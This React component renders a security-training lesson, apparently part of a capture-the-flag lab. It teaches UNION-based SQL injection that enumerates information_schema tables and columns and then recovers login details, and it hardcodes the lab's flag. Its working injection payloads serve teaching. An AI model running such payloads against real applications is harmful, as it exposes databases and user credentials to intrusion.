import { Prism as SyntaxHighlighter } from 'react-syntax-highlighter';
import { vscDarkPlus } from 'react-syntax-highlighter/dist/esm/styles/prism';
import Table from '@mui/material/Table';
import TableBody from '@mui/material/TableBody';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableHead from '@mui/material/TableHead';
import TableRow from '@mui/material/TableRow';
import Paper from '@mui/material/Paper';
import FlagInput from '../components/FlagInput';
import { Link } from 'react-router-dom';

const InformationSchemaLesson = () => {
  return (
    <div className="p-6 bg-white rounded shadow-md max-w-3xl ml-0">
      <h1 className="text-3xl font-bold mb-6">🧾 Information Schema Enumeration</h1>

      <section className="mb-8">
        <p className="text-base mb-4">
            To extract data using SQL injection, you need to know <strong>the detail about tables and columns, such as their name</strong>.
            <br />
            Even you don't have any information about them, <strong>databases usually stored this information in metadata tables</strong> — and you can obtain them through special system schema called <code>information_schema</code>.

        </p>


        <h2 className="text-xl font-semibold mb-2">💡 Syntax</h2>
        <p className="mt-2">To list all the tables in the current database:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus} wrapLines={true}>
          {`SELECT table_name FROM information_schema.tables WHERE table_schema = 'database_name';`}
        </SyntaxHighlighter>
        <p className="mt-2">To list all columns in a specific table:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus} wrapLines={true}>
          {`SELECT column_name FROM information_schema.columns WHERE table_name = 'users';`}
        </SyntaxHighlighter>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">🔍 Injected Example</h2>
        <p className="mt-2">Let’s say the application runs this:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus} wrapLines={true}>
          {`SELECT id, comment FROM feedback WHERE comment = '$input';`}
        </SyntaxHighlighter>

        <p className="mt-2">If you inject:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus} wrapLines={true}>
          {`' UNION SELECT table_name, null FROM information_schema.tables --`}
        </SyntaxHighlighter>

        <p className="mt-2">The query becomes:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus} wrapLines={true}>
          {`SELECT id, comment FROM feedback WHERE comment = '' UNION SELECT table_name, null FROM information_schema.tables --';`}
        </SyntaxHighlighter>

        <p className="mt-4">This will display <strong>all table names</strong>, including <code>users</code>.</p>

        <p className="mt-4">To discover columns in <code>users</code> table:</p>
        <SyntaxHighlighter language="sql" style={vscDarkPlus} wrapLines={true}>
          {`' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users' --`}
        </SyntaxHighlighter>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">🧠 Explanation</h2>
        <TableContainer component={Paper} sx={{ maxWidth: 500, backgroundColor: '#f9f9f9' }}>
          <Table size="small">
            <TableHead>
              <TableRow>
                <TableCell><strong>Part</strong></TableCell>
                <TableCell><strong>Meaning</strong></TableCell>
              </TableRow>
            </TableHead>
            <TableBody>
              <TableRow>
                <TableCell><code>information_schema.tables</code></TableCell>
                <TableCell>Lists all tables</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>information_schema.columns</code></TableCell>
                <TableCell>Lists all columns with their table name</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>UNION SELECT</code></TableCell>
                <TableCell>Joins your query with the app’s original</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>WHERE table_name = 'users'</code></TableCell>
                <TableCell>Filters to specific table</TableCell>
              </TableRow>
              <TableRow>
                <TableCell><code>--</code></TableCell>
                <TableCell>Comments out trailing SQL</TableCell>
              </TableRow>
            </TableBody>
          </Table>
        </TableContainer>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">💡 Why This Works</h2>
        <ul className="list-disc pl-6 text-base">
          <li><code>information_schema</code> is a built-in system schema in most SQL databases</li>
          <li>It allows you to explore database structure even without permission</li>
          <li>This is a <strong>common first step in enumeration attacks</strong></li>
        </ul>
      </section>

      <section className="mb-8">
        <h2 className="text-xl font-semibold mb-2">🧪 SQLi Exercise</h2>
        <p>Try using UNION-based injection to:</p>
        <ol className="list-decimal pl-6 text-base mb-2">
          <li>Enumerate all table names</li>
          <li>Find the table</li>
          <li>List all columns inside that table</li>
          <li>Obtain the information you need to login to the account</li>
        </ol>
        <Link to="/information-simulator">
          <button className="bg-blue-600 text-white font-bold px-4 py-2 rounded">
            Try it Yourself
          </button>
        </Link>


      </section>

      <section className="mt-8">
        <h2 className="text-xl font-semibold mb-2">🏁 Submit Your Flag</h2>
        <p className="text-base mb-2">If you successfully log in using the discovered account, enter the flag below:</p>
        <FlagInput correctFlag="flag{Well_Done_You_Found_The_Flag!}" />
      </section>
    </div>
  );
};

export default InformationSchemaLesson;
